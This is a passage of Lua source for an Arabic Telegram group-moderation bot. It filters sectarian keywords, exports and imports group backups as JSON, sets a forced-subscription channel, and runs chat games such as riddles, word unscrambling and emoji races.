Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ عذرا عزيزي ↫ ['..result.first_name_..'](https://T.me/'..(result.username_ or 'CXRCX')..') \n♰ ⌯ ممنوع الكفر في المجموعه', 1, 'md')
end 
getUser(msg.sender_user_id_,get_warning)
end end
--     SoUrCe BrAnD     --
if text:match("شيعي نكس") or text:match("سني نكس") or text:match("شيعه") or text:match("الشيعه") or text:match("السنه") or text:match("طائفتكم") or text:match("شيعي") or text:match("انا سني") or text:match("انا شيعي") or text:match("مسيحي") or text:match("يهودي") or text:match("صابئي") or text:match("ملحد") or text:match("بالسنه") or text:match("بالشيعه") or text:match("شيعة") then
if not DevBrAnD:get(BrAnD.."BrAnD:Lock:Taf"..msg.chat_id_) and not VipMem(msg) then
function get_warning(extra,result,success)
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ عذرا عزيزي ↫ ['..result.first_name_..'](https://T.me/'..(result.username_ or 'CXRCX')..') \n♰ ⌯ ممنوع التكلم بالطائفيه هنا', 1, 'md')
end 
getUser(msg.sender_user_id_,get_warning)
end end
--     SoUrCe BrAnD     --
if Sudo(msg) then
if text == 'جلب نسخه الكروبات' and SoUrCeCh(msg) or text == 'جلب نسخه احتياطيه' and SoUrCeCh(msg) then
local list = DevBrAnD:smembers(BrAnD..'BrAnD:Groups') 
local BotName = (DevBrAnD:get(BrAnD.."BrAnD:NameBot") or 'براند ')
local GetJson = '{"BotId": '..BrAnD..',"BotName": "'..BotName..'","GroupsList":{'  
for k,v in pairs(list) do 
LinkGroups = DevBrAnD:get(BrAnD.."BrAnD:Groups:Links"..v)
Welcomes = DevBrAnD:get(BrAnD..'BrAnD:Groups:Welcomes'..v) or ''
BrAnDConstructors = DevBrAnD:smembers(BrAnD..'BrAnD:BrAnDConstructor:'..v)
Constructors = DevBrAnD:smembers(BrAnD..'BrAnD:BasicConstructor:'..v)
BasicConstructors = DevBrAnD:smembers(BrAnD..'BrAnD:Constructor:'..v)
Managers = DevBrAnD:smembers(BrAnD..'BrAnD:Managers:'..v)
Admis = DevBrAnD:smembers(BrAnD..'BrAnD:Admins:'..v)
Vips = DevBrAnD:smembers(BrAnD..'BrAnD:VipMem:'..v)
if k == 1 then
GetJson = GetJson..'"'..v..'":{'
else
GetJson = GetJson..',"'..v..'":{'
end
if #Vips ~= 0 then 
GetJson = GetJson..'"Vips":['
for k,v in pairs(Vips) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Admis ~= 0 then
GetJson = GetJson..'"Admis":['
for k,v in pairs(Admis) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Managers ~= 0 then
GetJson = GetJson..'"Managers":['
for k,v in pairs(Managers) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Constructors ~= 0 then
GetJson = GetJson..'"Constructors":['
for k,v in pairs(Constructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #BasicConstructors ~= 0 then
GetJson = GetJson..'"BasicConstructors":['
for k,v in pairs(BasicConstructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #BrAnDConstructors ~= 0 then
GetJson = GetJson..'"BrAnDConstructors":['
for k,v in pairs(BrAnDConstructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if LinkGroups then
GetJson = GetJson..'"LinkGroups":"'..LinkGroups..'",'
end
GetJson = GetJson..'"Welcomes":"'..Welcomes..'"}'
end
GetJson = GetJson..'}}'
local File = io.open('./'..BrAnD..'.json', "w")
File:write(GetJson)
File:close()
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './'..BrAnD..'.json', '♰ ⌯ يحتوي الملف على ↫ '..#list..' مجموعه',dl_cb, nil)
end
if text == 'رفع النسخه' and tonumber(msg.reply_to_message_id_) > 0 or text == 'رفع النسخه الاحتياطيه' and tonumber(msg.reply_to_message_id_) > 0 then   
function by_reply(extra, result, success)   
if result.content_.document_ then 
local ID_FILE = result.content_.document_.document_.persistent_id_ 
local File_Name = result.content_.document_.file_name_
AddFile(msg,msg.chat_id_,ID_FILE,File_Name)
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
--     SoUrCe BrAnD     --
if DevBrAnD:get(BrAnD.."SET:GAME"..msg.chat_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
Dev_BrAnD( msg.chat_id_, msg.id_, 1,"♰ ⌯ يوجد فقط ( 6 ) اختيارات\n♰ ⌯ ارسل اختيارك مره اخرى", 1, "md")    
return false  end 
local GETNUM = DevBrAnD:get(BrAnD.."GAMES"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevBrAnD:del(BrAnD.."SET:GAME"..msg.chat_id_)   
Dev_BrAnD( msg.chat_id_, msg.id_, 1,'♰ ⌯ *المحيبس باليد رقم* ↫ '..NUM..'\n♰ ⌯ *مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, "md") 
DevBrAnD:incrby(BrAnD..'BrAnD:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
elseif tonumber(NUM) ~= tonumber(GETNUM) then
DevBrAnD:del(BrAnD.."SET:GAME"..msg.chat_id_)   
Dev_BrAnD( msg.chat_id_, msg.id_, 1,'♰ ⌯ *المحيبس باليد رقم* ↫ '..GETNUM..'\n♰ ⌯ *للاسف لقد خسرت حاول مره اخرى للعثور على المحيبس*', 1, "md")
end
end
end
if DevBrAnD:get(BrAnD..'DevBrAnD4'..msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_, "♰ ⌯ تم الغاء الامر")
DevBrAnD:del(BrAnD..'DevBrAnD4'..msg.sender_user_id_)
return false  end 
DevBrAnD:del(BrAnD..'DevBrAnD4'..msg.sender_user_id_)
local username = string.match(text, "@[%a%d_]+") 
tdcli_function({ID = "SearchPublicChat",username_ = username},function(arg,data) 
if data and data.message_ and data.message_ == "USERNAME_NOT_OCCUPIED" then 
send(msg.chat_id_, msg.id_, '♰ ⌯ المعرف لا يوجد فيه قناة')
return false  end
if data and data.type_ and data.type_.ID and data.type_.ID == 'PrivateChatInfo' then
send(msg.chat_id_, msg.id_, '♰ ⌯ عذرا لا يمكنك وضع معرف حسابات في الاشتراك')
return false  end
if data and data.type_ and data.type_.ChANnEl_ and data.type_.ChANnEl_.is_supergroup_ == true then
send(msg.chat_id_, msg.id_, '♰ ⌯ عذرا لا يمكنك وضع معرف مجموعه في الاشتراك')
return false  end
if data and data.type_ and data.type_.ChANnEl_ and data.type_.ChANnEl_.is_supergroup_ == false then
if data and data.type_ and data.type_.ChANnEl_ and data.type_.ChANnEl_.ID and data.type_.ChANnEl_.status_.ID == 'ChatMemberStatusEditor' then
send(msg.chat_id_, msg.id_,'♰ ⌯ البوت ادمن في القناة \n♰ ⌯ تم تفعيل الاشتراك الاجباري \n♰ ⌯ ايدي القناة ↫ '..data.id_..'\n♰ ⌯ معرف القناة ↫ [@'..data.type_.ChANnEl_.username_..']')
DevBrAnD:set(BrAnD..'DevBrAnD2',data.id_)
DevBrAnD:set(BrAnD..'DevBrAnD3','@'..data.type_.ChANnEl_.username_)
else
send(msg.chat_id_, msg.id_,'♰ ⌯ عذرا البوت ليس ادمن في القناة')
end
return false  
end
end,nil)
end
--     SoUrCe BrAnD     --
if DevBrAnD:get(BrAnD.."BrAnD:DevText" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
DevBrAnD:del(BrAnD.."BrAnD:DevText" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم الغاء الامر', 1, 'md')
return false 
end 
DevBrAnD:del(BrAnD.."BrAnD:DevText" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
local DevText = msg.content_.text_:match("(.*)")
DevBrAnD:set(BrAnD.."DevText", DevText)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم حفظ كليشة المطور", 1, "md")
end
if DevBrAnD:get(BrAnD..'BrAnD:NameBot'..msg.sender_user_id_) == 'msg' then
if text and text:match("^الغاء$") then 
DevBrAnD:del(BrAnD..'BrAnD:NameBot'..msg.sender_user_id_)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم الغاء الامر', 1, 'md')
return false 
end 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم حفظ اسم البوت ', 1, 'html')
DevBrAnD:del(BrAnD..'BrAnD:NameBot'..msg.sender_user_id_)
DevBrAnD:set(BrAnD..'BrAnD:NameBot', text)
return false 
end
--     SoUrCe BrAnD     --
if text == "الرابط" then
if not DevBrAnD:get(BrAnD.."BrAnD:Lock:GpLinks"..msg.chat_id_) then 
if DevBrAnD:get(BrAnD.."BrAnD:Groups:Links"..msg.chat_id_) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ 𝒈𝒓𝒐𝒖𝒑 𝒍𝒊𝒏𝒌 ↬ ⤈ \n⍆═════BR═════⍅\n"..DevBrAnD:get(BrAnD.."BrAnD:Groups:Links"..msg.chat_id_), 1, "html")
else 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ لايوجد رابط ارسل ↫ ضع رابط او ارسل ↫ انشاء رابط للانشاء', 1, 'md')
end
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ جلب رابط المجموعه معطل', 1, 'md')
end
end
--     SoUrCe BrAnD     --
if ChatType == 'sp' or ChatType == 'gp'  then
if text == 'بوت' or text == 'بوتت' then 
NameBot = (DevBrAnD:get(BrAnD..'BrAnD:NameBot') or 'براند ')
local BrAnDTeAM= {"لتكول بوت اسمي "..NameBot.." 😒🔪","اسمي القميل "..NameBot.." 😚♥️","عندي اسم تره 😒💔","صيحولي "..NameBot.." كافي بوت 😒🔪","انت البوت لك 😒💔"} 
DevBrAnD2 = math.random(#BrAnDTEAM) 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, BrAnDTEAM[DevBrAnD2] , 1, 'html') 
return false
end
if text == 'اسم البوت' or text == 'البوت شنو اسمه' or text == 'شسمه البوت' or text == 'البوت شسمه' then
NameBot = (DevBrAnD:get(BrAnD..'BrAnD:NameBot') or 'براند ') 
local BrAnDTeAM= {"اسمي القميل "..NameBot.." 😚♥️","هلاا يروحيي وياكك "..NameBot.." 😻♥️"} 
DevBrAnD2 = math.random(#BrAnDTEAM) 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, BrAnDTEAM[DevBrAnD2] , 1, 'html') 
return false
end
if text and text == (DevBrAnD:get(BrAnD..'BrAnD:NameBot') or 'براند ') then 
NameBot = (DevBrAnD:get(BrAnD..'BrAnD:NameBot') or 'براند ')
local namebot = {'😸♥️ هلا كلبي وياك '..NameBot..' تفضل','ترةه مصختهاا احجيي شرايد 😕😒💔','اطلقق واحدد يصيح '..NameBot..' 😻♥️','خبصتت امنةة شتريدد عااد 🤧😒💔'} 
name = math.random(#namebot) 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, namebot[name] , 1, 'html') 
return false 
end
if text =='نقاطي' and ChCheck(msg) then 
if tonumber((DevBrAnD:get(BrAnD..'BrAnD:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
Dev_BrAnD(msg.chat_id_, msg.id_, 1,'♰ ⌯ لم تربح اي نقطه\n♰ ⌯ ارسل ↫ الالعاب للعب', 1, 'md')
else 
Dev_BrAnD(msg.chat_id_, msg.id_, 1,'♰ ⌯ عدد النقاط التي ربحتها ↫ '..(DevBrAnD:get(BrAnD..'BrAnD:GamesNumber'..msg.chat_id_..msg.sender_user_id_)), 1, 'md')
end
end
if text ==  'حذف رسائلي' and ChCheck(msg) or text ==  'مسح رسائلي' and ChCheck(msg) then DevBrAnD:del(BrAnD..'BrAnD:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_) Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم حذف جميع رسائلك', 1, 'md') end
if text ==  'حذف نقاطي' and ChCheck(msg) or text ==  'مسح نقاطي' and ChCheck(msg) then DevBrAnD:del(BrAnD..'BrAnD:GamesNumber'..msg.chat_id_..msg.sender_user_id_) Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم حذف جميع نقاطك', 1, 'md') end
--     SoUrCe BrAnD     --
if text == 'سمايلات' and ChCheck(msg) or text == 'السمايلات' and ChCheck(msg) then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Games'..msg.chat_id_) then
DevBrAnD2 = {'🍏','🍎','🍐','🍊','🍋','🍌','🍉','🍇','🍓','🍈','🍒','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥒','🌶','🌽','🥕','🥔','🍠','🥐','🍞','🥖','🥨','🧀','🥚','🍳','🥞','🥓','🥩','🍗','🍖','🌭','🍔','🍟','🍕','🥪','🥙','🍼','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🏆','🎻','🎸','🎺','🥁','🎹','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🛎','📤','🎗','🏵','🎖','🏆','🥌','🛷','🚕','🚗','🚙','🚌','🚎','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔️','🛡','🔮','🌡','💣','⏱','🛢','📓','📗','📂','📅','📪','📫','📬','📭','⏰','📺','🎚','☎️','📡'}
name = DevBrAnD2[math.random(#DevBrAnD2)]
DevBrAnD:set(BrAnD..'BrAnD:GameNum'..msg.chat_id_,name)
DevBrAnD:del(BrAnD..'BrAnD:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'🍞','🍞')
name = string.gsub(name,'🥖','🥖')
name = string.gsub(name,'🥨','🥨')
name = string.gsub(name,'🧀','🧀')
name = string.gsub(name,'🥚','🥚')
name = string.gsub(name,'🍳','🍳')
name = string.gsub(name,'🥞','🥞')
name = string.gsub(name,'🥓','🥓')
name = string.gsub(name,'🥩','🥩')
name = string.gsub(name,'🍗','🍗')
name = string.gsub(name,'🍖','🍖')
name = string.gsub(name,'🌭','🌭')
name = string.gsub(name,'🍔','🍔')
name = string.gsub(name,'🍟','🍟')
name = string.gsub(name,'🍕','🍕')
name = string.gsub(name,'🥪','🥪')
name = string.gsub(name,'🥙','🥙')
name = string.gsub(name,'🍼','🍼')
name = string.gsub(name,'☕️','☕️')
name = string.gsub(name,'🍵','🍵')
name = string.gsub(name,'🥤','🥤')
name = string.gsub(name,'🍶','🍶')
name = string.gsub(name,'🍺','🍺')
name = string.gsub(name,'🍏','🍏')
name = string.gsub(name,'🍎','🍎')
name = string.gsub(name,'🍐','🍐')
name = string.gsub(name,'🍊','🍊')
name = string.gsub(name,'🍋','🍋')
name = string.gsub(name,'🍌','🍌')
name = string.gsub(name,'🍉','🍉')
name = string.gsub(name,'🍇','🍇')
name = string.gsub(name,'🍓','🍓')
name = string.gsub(name,'🍈','🍈')
name = string.gsub(name,'🍒','🍒')
name = string.gsub(name,'🍑','🍑')
name = string.gsub(name,'🍍','🍍')
name = string.gsub(name,'🥥','🥥')
name = string.gsub(name,'🥝','🥝')
name = string.gsub(name,'🍅','🍅')
name = string.gsub(name,'🍆','🍆')
name = string.gsub(name,'🥑','🥑')
name = string.gsub(name,'🥦','🥦')
name = string.gsub(name,'🥒','🥒')
name = string.gsub(name,'🌶','🌶')
name = string.gsub(name,'🌽','🌽')
name = string.gsub(name,'🥕','🥕')
name = string.gsub(name,'🥔','🥔')
name = string.gsub(name,'🍠','🍠')
name = string.gsub(name,'🥐','🥐')
name = string.gsub(name,'🍻','🍻')
name = string.gsub(name,'🏀','🏀')
name = string.gsub(name,'⚽️','⚽️')
name = string.gsub(name,'🏈','🏈')
name = string.gsub(name,'⚾️','⚾️')
name = string.gsub(name,'🎾','🎾')
name = string.gsub(name,'🏐','🏐')
name = string.gsub(name,'🏉','🏉')
name = string.gsub(name,'🎱','🎱')
name = string.gsub(name,'🏓','🏓')
name = string.gsub(name,'🏸','🏸')
name = string.gsub(name,'🥅','🥅')
name = string.gsub(name,'🎰','🎰')
name = string.gsub(name,'🎮','🎮')
name = string.gsub(name,'🎳','🎳')
name = string.gsub(name,'🎯','🎯')
name = string.gsub(name,'🏆','🏆')
name = string.gsub(name,'🎻','🎻')
name = string.gsub(name,'🎸','🎸')
name = string.gsub(name,'🎺','🎺')
name = string.gsub(name,'🥁','🥁')
name = string.gsub(name,'🎹','🎹')
name = string.gsub(name,'🎼','🎼')
name = string.gsub(name,'🎧','🎧')
name = string.gsub(name,'🎤','🎤')
name = string.gsub(name,'🎬','🎬')
name = string.gsub(name,'🎨','🎨')
name = string.gsub(name,'🎭','🎭')
name = string.gsub(name,'🎪','🎪')
name = string.gsub(name,'🛎','🛎')
name = string.gsub(name,'📤','📤')
name = string.gsub(name,'🎗','🎗')
name = string.gsub(name,'🏵','🏵')
name = string.gsub(name,'🎖','🎖')
name = string.gsub(name,'🏆','🏆')
name = string.gsub(name,'🥌','🥌')
name = string.gsub(name,'🛷','🛷')
name = string.gsub(name,'🚕','🚕')
name = string.gsub(name,'🚗','🚗')
name = string.gsub(name,'🚙','🚙')
name = string.gsub(name,'🚌','🚌')
name = string.gsub(name,'🚎','🚎')
name = string.gsub(name,'🏎','🏎')
name = string.gsub(name,'🚓','🚓')
name = string.gsub(name,'🚑','🚑')
name = string.gsub(name,'🚚','🚚')
name = string.gsub(name,'🚛','🚛')
name = string.gsub(name,'🚜','🚜')
name = string.gsub(name,'🇮🇶','🇮🇶')
name = string.gsub(name,'⚔️','⚔️')
name = string.gsub(name,'🛡','🛡')
name = string.gsub(name,'🔮','🔮')
name = string.gsub(name,'🌡','🌡')
name = string.gsub(name,'💣','💣')
name = string.gsub(name,'⏱','⏱')
name = string.gsub(name,'🛢','🛢')
name = string.gsub(name,'📒','📒')
name = string.gsub(name,'📗','📗')
name = string.gsub(name,'📅','📆')
name = string.gsub(name,'📪','📪')
name = string.gsub(name,'📫','📫')
name = string.gsub(name,'📬','📬')
name = string.gsub(name,'📭','📭')
name = string.gsub(name,'⏰','⏰')
name = string.gsub(name,'📺','📺')
name = string.gsub(name,'🎚','🎚')
name = string.gsub(name,'☎️','☎️')
BrAnDTeAM= '♰ ⌯ اول واحد يدز هذا السمايل يربح ↫ '..name
Dev_BrAnD(msg.chat_id_, msg.id_, 1,BrAnDTEAM, 1, 'md')
return false
end end
if text == DevBrAnD:get(BrAnD..'BrAnD:GameNum'..msg.chat_id_) and not DevBrAnD:get(BrAnD..'BrAnD:Games:Ids'..msg.chat_id_) then
if not DevBrAnD:get(BrAnD..'BrAnD:Games:Ids'..msg.chat_id_) then 
BrAnDTeAM= '♰ ⌯ مبروك لقد ربحت في اللعبه \n♰ ⌯ ارسل ↫ سمايلات للعب مره اخرى'
Dev_BrAnD(msg.chat_id_, msg.id_, 1,BrAnDTEAM, 1, 'md')
DevBrAnD:incrby(BrAnD..'BrAnD:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevBrAnD:set(BrAnD..'BrAnD:Games:Ids'..msg.chat_id_,true)
end
if text == 'ترتيب' and ChCheck(msg) or text == 'الترتيب' and ChCheck(msg) then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Games'..msg.chat_id_) then
DevBrAnD2 = {'سحور','سياره','استقبال','قنفه','ايفون','بزونه','مطبخ','كرستيانو','دجاجه','مدرسه','الوان','غرفه','ثلاجه','كهوه','سفينه','العراق','محطه','طياره','رادار','منزل','مستشفى','كهرباء','تفاحه','اخطبوط','سلمون','فرنسا','برتقاله','تفاح','مطرقه','بتيته','لهانه','شباك','باص','سمكه','ذباب','تلفاز','حاسوب','انترنيت','ساحه','جسر'};
name = DevBrAnD2[math.random(#DevBrAnD2)]
DevBrAnD:set(BrAnD..'BrAnD:GameNum'..msg.chat_id_,name)
DevBrAnD:del(BrAnD..'BrAnD:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'سحور','س ر و ح')
name = string.gsub(name,'سياره','ه ر س ي ا')
name = string.gsub(name,'استقبال','ل ب ا ت ق س ا')
name = string.gsub(name,'قنفه','ه ق ن ف')
name = string.gsub(name,'ايفون','و ن ف ا')
name = string.gsub(name,'بزونه','ز و ه ن')
name = string.gsub(name,'مطبخ','خ ب ط م')
name = string.gsub(name,'كرستيانو','س ت ا ن و ك ر ي')
name = string.gsub(name,'دجاجه','ج ج ا د ه')
name = string.gsub(name,'مدرسه','ه م د ر س')
name = string.gsub(name,'الوان','ن ا و ا ل')
name = string.gsub(name,'غرفه','غ ه ر ف')
name = string.gsub(name,'ثلاجه','ج ه ت ل ا')
name = string.gsub(name,'كهوه','ه ك ه و')
name = string.gsub(name,'سفينه','ه ن ف ي س')
name = string.gsub(name,'العراق','ق ع ا ل ر ا')
name = string.gsub(name,'محطه','ه ط م ح')
name = string.gsub(name,'طياره','ر ا ط ي ه')
name = string.gsub(name,'رادار','ر ا ر ا د')
name = string.gsub(name,'منزل','ن ز م ل')
name = string.gsub(name,'مستشفى','ى ش س ف ت م')
name = string.gsub(name,'كهرباء','ر ب ك ه ا ء')
name = string.gsub(name,'تفاحه','ح ه ا ت ف')
name = string.gsub(name,'اخطبوط','ط ب و ا خ ط')
name = string.gsub(name,'سلمون','ن م و ل س')
name = string.gsub(name,'فرنسا','ن ف ر س ا')
name = string.gsub(name,'برتقاله','ر ت ق ب ا ه ل')
name = string.gsub(name,'تفاح','ح ف ا ت')
name = string.gsub(name,'مطرقه','ه ط م ر ق')
name = string.gsub(name,'بتيته','ب ت ت ي ه')
name = string.gsub(name,'لهانه','ه ن ل ه ل')
name = string.gsub(name,'شباك','ب ش ا ك')
name = string.gsub(name,'باص','ص ا ب')
name = string.gsub(name,'سمكه','ك س م ه')
name = string.gsub(name,'ذباب','ب ا ب ذ')
name = string.gsub(name,'تلفاز','ت ف ل ز ا')
name = string.gsub(name,'حاسوب','س ا ح و ب')
name = string.gsub(name,'انترنيت','ا ت ن ر ن ي ت')
name = string.gsub(name,'ساحه','ح ا ه س')
name = string.gsub(name,'جسر','ر ج س')
BrAnDTeAM= '♰ ⌯ اول واحد يرتبها يربح ↫ '..name
Dev_BrAnD(msg.chat_id_, msg.id_, 1,BrAnDTEAM, 1, 'md')
return false
end end
if text == DevBrAnD:get(BrAnD..'BrAnD:GameNum'..msg.chat_id_) and not DevBrAnD:get(BrAnD..'BrAnD:Games:Ids'..msg.chat_id_) then
if not DevBrAnD:get(BrAnD..'BrAnD:Games:Ids'..msg.chat_id_) then 
BrAnDTeAM= '♰ ⌯ مبروك لقد ربحت في اللعبه \n♰ ⌯ ارسل ↫ ترتيب للعب مره اخرى'
Dev_BrAnD(msg.chat_id_, msg.id_, 1,BrAnDTEAM, 1, 'md')
DevBrAnD:incrby(BrAnD..'BrAnD:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevBrAnD:set(BrAnD..'BrAnD:Games:Ids'..msg.chat_id_,true)
end
if text == 'محيبس' and ChCheck(msg) or text == 'بات' and ChCheck(msg) or text == 'المحيبس' and ChCheck(msg) then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Games'..msg.chat_id_) then
Num = math.random(1,6)
DevBrAnD:set(BrAnD.."GAMES"..msg.chat_id_,Num) 
TEST = [[
➀     ➁     ➂     ➃     ➄     ➅
↓     ↓     ↓     ↓     ↓     ↓
👊 ‹› 👊🏻 ‹› 👊🏼 ‹› 👊🏽 ‹› 👊🏾 ‹› 👊🏿

♰ ⌯ اختر رقم لاستخراج المحيبس
♰ ⌯ الفائز يحصل على (5) نقاط
]]
Dev_BrAnD(msg.chat_id_, msg.id_, 1, TEST, 1, "md") 
DevBrAnD:setex(BrAnD.."SET:GAME"..msg.chat_id_, 100, true)  
return false  
end end
if text == 'حزوره' and ChCheck(msg) or text == 'الحزوره' and ChCheck(msg) then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Games'..msg.chat_id_) then
DevBrAnD2 = {'الجرس','عقرب الساعه','السمك','المطر','5','الكتاب','البسمار','7','الكعبه','بيت الشعر','لهانه','انا','امي','الابره','الساعه','22','غلط','كم الساعه','البيتنجان','البيض','المرايه','الضوء','الهواء','الضل','العمر','القلم','المشط','الحفره','البحر','الثلج','الاسفنج','الصوت','بلم'};
name = DevBrAnD2[math.random(#DevBrAnD2)]
DevBrAnD:set(BrAnD..'BrAnD:GameNum'..msg.chat_id_,name)
DevBrAnD:del(BrAnD..'BrAnD:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'الجرس','شيئ اذا لمسته صرخ ما هوه ؟')
name = string.gsub(name,'عقرب الساعه','اخوان لا يستطيعان تمضيه اكثر من دقيقه معا فما هما ؟')
name = string.gsub(name,'السمك','ما هو الحيوان الذي لم يصعد الى سفينة نوح عليه السلام ؟')
name = string.gsub(name,'المطر','شيئ يسقط على رأسك من الاعلى ولا يجرحك فما هو ؟')
name = string.gsub(name,'5','ما العدد الذي اذا ضربته بنفسه واضفت عليه 5 يصبح ثلاثين ')
name = string.gsub(name,'الكتاب','ما الشيئ الذي له اوراق وليس له جذور ؟')
name = string.gsub(name,'البسمار','ما هو الشيئ الذي لا يمشي الا بالضرب ؟')
name = string.gsub(name,'7','عائله مؤلفه من 6 بنات واخ لكل منهن .فكم عدد افراد العائله ')
name = string.gsub(name,'الكعبه','ما هو الشيئ الموجود وسط مكة ؟')
name = string.gsub(name,'بيت الشعر','ما هو البيت الذي ليس فيه ابواب ولا نوافذ ؟ ')
name = string.gsub(name,'لهانه','وحده حلوه ومغروره تلبس مية تنوره .من هيه ؟ ')
name = string.gsub(name,'انا','ابن امك وابن ابيك وليس باختك ولا باخيك فمن يكون ؟')
name = string.gsub(name,'امي','اخت خالك وليست خالتك من تكون ؟ ')
name = string.gsub(name,'الابره','ما هو الشيئ الذي كلما خطا خطوه فقد شيئا من ذيله ؟ ')
name = string.gsub(name,'الساعه','ما هو الشيئ الذي يقول الصدق ولكنه اذا جاع كذب ؟')
name = string.gsub(name,'22','كم مره ينطبق عقربا الساعه على بعضهما في اليوم الواحد ')
name = string.gsub(name,'غلط','ما هي الكلمه الوحيده التي تلفض غلط دائما ؟ ')
name = string.gsub(name,'كم الساعه','ما هو السؤال الذي تختلف اجابته دائما ؟')
name = string.gsub(name,'البيتنجان','جسم اسود وقلب ابيض وراس اخظر فما هو ؟')
name = string.gsub(name,'البيض','ماهو الشيئ الذي اسمه على لونه ؟')
name = string.gsub(name,'المرايه','ارى كل شيئ من دون عيون من اكون ؟ ')
name = string.gsub(name,'الضوء','ما هو الشيئ الذي يخترق الزجاج ولا يكسره ؟')
name = string.gsub(name,'الهواء','ما هو الشيئ الذي يسير امامك ولا تراه ؟')
name = string.gsub(name,'الضل','ما هو الشيئ الذي يلاحقك اينما تذهب ؟ ')
name = string.gsub(name,'العمر','ما هو الشيء الذي كلما طال قصر ؟ ')
name = string.gsub(name,'القلم','ما هو الشيئ الذي يكتب ولا يقرأ ؟')
name = string.gsub(name,'المشط','له أسنان ولا يعض ما هو ؟ ')
name = string.gsub(name,'الحفره','ما هو الشيئ اذا أخذنا منه ازداد وكبر ؟')
name = string.gsub(name,'البحر','ما هو الشيئ الذي يرفع اثقال ولا يقدر يرفع مسمار ؟')
name = string.gsub(name,'الثلج','انا ابن الماء فان تركوني في الماء مت فمن انا ؟')
name = string.gsub(name,'الاسفنج','كلي ثقوب ومع ذالك احفض الماء فمن اكون ؟')
name = string.gsub(name,'الصوت','اسير بلا رجلين ولا ادخل الا بالاذنين فمن انا ؟')
name = string.gsub(name,'بلم','حامل ومحمول نصف ناشف ونصف مبلول فمن اكون ؟ ')
BrAnDTeAM= '♰ ⌯ اول واحد يحلها يربح ↫ '..name
Dev_BrAnD(msg.chat_id_, msg.id_, 1,BrAnDTEAM, 1, 'md')
return false
end end
if text == DevBrAnD:get(BrAnD..'BrAnD:GameNum'..msg.chat_id_) and not DevBrAnD:get(BrAnD..'BrAnD:Games:Ids'..msg.chat_id_) then
if not DevBrAnD:get(BrAnD..'BrAnD:Games:Ids'..msg.chat_id_) then 
BrAnDTeAM= '♰ ⌯ مبروك لقد ربحت في اللعبه \n♰ ⌯ ارسل ↫ حزوره للعب مره اخرى'
Dev_BrAnD(msg.chat_id_, msg.id_, 1,BrAnDTEAM, 1, 'md')
DevBrAnD:incrby(BrAnD..'BrAnD:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevBrAnD:set(BrAnD..'BrAnD:Games:Ids'..msg.chat_id_,true)
end 
if text == 'المعاني' and ChCheck(msg) or text == 'معاني' and ChCheck(msg) then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Games'..msg.chat_id_) then
